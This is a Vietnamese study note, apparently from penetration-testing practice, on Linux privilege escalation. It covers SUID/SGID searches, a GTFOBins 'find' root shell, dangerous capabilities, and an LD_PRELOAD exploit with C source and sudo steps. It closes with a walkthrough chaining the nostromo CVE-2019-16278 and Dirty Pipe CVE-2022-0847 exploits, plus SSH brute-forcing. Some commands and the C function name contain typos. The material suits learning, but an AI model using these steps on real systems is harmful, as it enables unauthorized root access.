# Tài liệu và tool/script tham khảo:

[https://gtfobins.github.io/](https://gtfobins.github.io/)

[https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

  

---

# Set User ID (SUID)

> [!important] + Là một quyền đặc biệt trên Unix/Linux.<br>+ Khi 1 file thực thi (executable) có SUID bit, người dùng thực thi file đó sẽ có quyền của chủ sở hữu file trong suốt quá trình chạy.<br>+ Dùng SUID cho người dùng bình thường khi cần thực thi, một số tác vụ yêu cầu root nhưng được kiểm soát.

**Ví dụ**: /usr/bin/passwd  
-rwsr-xr-x  
⇒ “**s**” xuất hiện ở cột quyền của user (rws) thể hiện file đã set SUID

  

```Bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

- **Các options**:
    - -4000 : giá trị của bit SUID
    - 2>/dev/null : bỏ qua lỗi permission denied

```Bash
find / -user root -perm -2000 -exec ls -ldb {} \; 2>/dev/null
```

- **Các options**:
    - -2000 : giá trị của bit SGID
    - 2>/dev/null : bỏ qua lỗi permission denied

> Lợi dụng SUID và SGID để leo thang đặc quyền

> [!important] + Nếu một binary như find, nano, vim, bash, python, ... có SUID ta có thể tận dụng chức năng nó để thực thi shell với quyền root.<br>+ Sử dụng [GTFOBins](https://gtfobins.github.io/).

**Ví dụ**:

```Bash
ls -l /usr/bin/find
```

\#Giả sử có SUID: -rwsr-xr-x  
\#Nhập:

```Bash
./find . -exec /bin/sh -p \; -quit
```

> **Giải thích**: **-p** giúp giữ lại UID của người sở hữu file thực thi ⇒ Lên được root

---

# Linux Capabilities

> [!important] + Chia nhỏ root thành các quyền riêng biệt, chỉ cấp đúng quyền chương trình cần.<br>+ Ví dụ: ping không cần root, chỉ cần cap_net_raw

## Cấu trúc

> [!important] Cấu trúc mỗi file (hoặc tiến trình) có 3 bộ capabilities:

### Permitted(**p**)

Danh sách capabilities mà tiến trình được phép dùng.

Nếu capability không nằm trong **p** thì tiến trình tuyệt đối không được phép dùng capability đó dù bằng cách nào.

### Effective(e)

Danh sách capabilities hiện đang được kích hoạt và có hiệu lực. Nếu capability chỉ nằm trong **p** mà không nằm trong **e** thì được phép có nhưng chưa được dùng.

### Inheritable(i)

Danh sách capabilities có thể truyền sang tiến trình con (ít gặp hơn).

## Quét capability

```Bash
getcap -r /2>/dev/null
```

```Bash
getcap -r /2>/dev/null | grep -E 'cap_(sys_admin|dac_override|setuid|setgid)'
```

> **Lưu ý**: Có thể cần phải whereis getcap rồi dùng path mới chạy command được.

### Một số capability nguy hiểm có thể exploit

- cap_sys_admin : làm được mọi thứ
- cap_dac_override : bỏ qua mọi permission checking (read, exec file, ...)
- cap_setuid / cap_setgid : chuyển UID, GID ⇒ leo thang
- cap_net_raw : gửi packet (sniff, spoof)
- cap_sys_module : load kernel module

---

# Shared Libraries và leo thang đặc quyền qua LD_PRELOAD

> [!important] Cách khai thác: user thường ⇒ kiểm tra sudo -l ⇒ phát hiện quyền chạy binary nào đó (no passwd) ⇒ phát hiện LD_PRELOAD ⇒ Viết mã C ⇒ Chạy sudo LD_PRELOAD=/tmp/es.co/binary ⇒ Lên root

> [!important] Shared Libraries là những đoạn mã được biên dịch sẵn mà nhiều chương trình có thể dùng lại thay vì viết lại từ đầu.

**Có 2 loại**:

- Static libary (.a) : gộp trực tiếp vào binary khi biên dịch.
- Shared library (.so) : được load khi chương trình chạy.

Muốn xem một chương trình cần libary nào ⇒

```Bash
ldd /bin/ping
```

  

> [!important] LD_PRELOAD là biến môi trường đặc biệt trong Linux. Nó sẽ ép hệ thống load thư viện mà ta chỉ định của chương trình. Cho phép ta override lên các hàm hệ thống như getuid(); system(); …

> [!important] Cách khai thác: giả sử ta là user thường, có quyền chạy binary nào đó bằng sudo, không yêu cầu mật khẩu:

```Bash
sudo -l
```

```Bash
(ALL) NOPASSWD: /usr/local/bin/sys_backup
```

⇒ /usr/local/bin/sys_backup không là SUID, không thuộc GTFOBins nên không khai thác trực tiếp được.

Tuy nhiên, ta thấy:

```Bash
env_keep+=LD_PRELOAD
```

⇒ Lỗ hỏng.

**Các bước khai thác**:

+ Bước 1: Viết chương trình C:

```C
\#include <stdio.h>
\#include <stdlib.h>
\#include <sys/types.h>

void_init() {
	unsetenv("LD_PRELOAD");
	setresuid(0, 0, 0);
	system("/bin/bash -p");
}
```

⇒ Dùng init() để Shared Libraries load bằng LD_PRELOAD thì hàm _init() chạy đầu tiên.

+ Bước 2: Compile code thành shared object (.so)

```Bash
gcc -fPIC -shared -nostartfiles -o /tmp/escalate.so escalate.c
```

> **Giải thích**: -fPIC dùng để tạo mã máy không phụ thuộc vào địa chỉ cố định trên bộ nhớ. Vì .so có thể load cùng nhiều process khác nhau tại các vị trí khác nhau. Nếu không có -fPIC thì thư viện có thể bị crash.  
> -shared : tạo ra moọt .so thay vì .out hoặc ELF binary.  
> -nostartfiles : chỉ định gcc không thêm bất kỳ starup files nào vào chương trình. Nó sẽ tạo các file như: _start, crt1.0, … để khởi tạo môi trường trước khi gọi main(); nhưng ta không cần main() mà chỉ cần _init().

+ Bước 3: Gọi binary được cấp quyền bằng LD_PRELOAD:

```Bash
sudo LD_PRELOAD=/tmp/escalte.so /usr/local/bin/sys_backup
```

⇒ Lấy được root

---

# Một ví dụ khai thác thực tế:

## Tình huống 1:

Quét nmap thì tra ra được nostromo 1.9.6, OSINT ta biết CVE-2019-16278 nên ta sẽ khai thác được 1 chút và vào được shell của một user có giới hạn.

Giờ ta leo thang bằng cách uname -a thì tra được version kernel là 5.11.051100-generic thì có lỗi là CVE-2022-0847. Vào github thì có cả file sẵn để khai thác. Điều hướng cd/tmp (vì các khu vực khác ta không có quyền đọc/ghi). Tạo một python3 -m http.server 8080 để mở một server cho phép wget trên target machine.

Ta biên dịch ra:

```Bash
gcc exploit -2.c -o exploit -2
```

Ta có thể check SUID, dù không có trên GTFOBins nhưng vẫn có thể:

```Bash
./exploit-2 /usr/bin/su
```

⇒ **Root**

## Tình huống 2:

Quét nmap tra được ssh, brute-force rồi kiểm tra capabilities thì thấy python3.9 có +ep, ta kiểm tra GTFOBins ⇒ **Root**